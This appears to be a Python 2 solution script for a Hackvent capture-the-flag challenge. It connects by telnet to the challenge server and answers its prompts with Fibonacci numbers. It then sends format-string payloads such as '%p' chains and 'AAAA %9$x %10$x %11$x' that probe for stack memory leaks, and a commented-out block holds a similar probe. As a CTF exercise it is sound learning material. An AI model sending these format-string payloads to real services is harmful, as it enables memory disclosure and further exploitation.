import telnetlib

# generator to produce fibonacci numbers
a,b = 0,1    
def fibI():
    global a,b
    while True:
        a,b = b, a+b
        yield a
 
server = "challenges.hackvent.hacking-lab.com"
port = 8888

# get generator to the right point in the sequence
fib=fibI()
fib.next()
fib.next()
fib.next()
fib.next()

print "starting"

#connect to service 
tn = telnetlib.Telnet(server, port)
print tn.read_until("\n")
print tn.read_until("\n")

'''    
exploit='%p %p %p %p'    
tn.write(exploit)    
tn.write('\n')    
    
    
print tn.read_until("\n")    
print tn.read_all()

tn.close()
'''
    
# play until we win
response="ACK, go ahead..."
count=0
while response == "ACK, go ahead...":    
    count +=1    
    # answer with next in fibonacci sequence
    if (count < 10):
        answer=str(fib.next())
    else:
        answer='%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
        answer='AAAA %9$x %10$x %11$x '
        
    print 'answering: '+answer
    tn.write(answer)
    tn.write('\n')
    response=tn.read_until('\n').strip('\n')
    print response        
        
# see what else they have to say        
print tn.read_all()

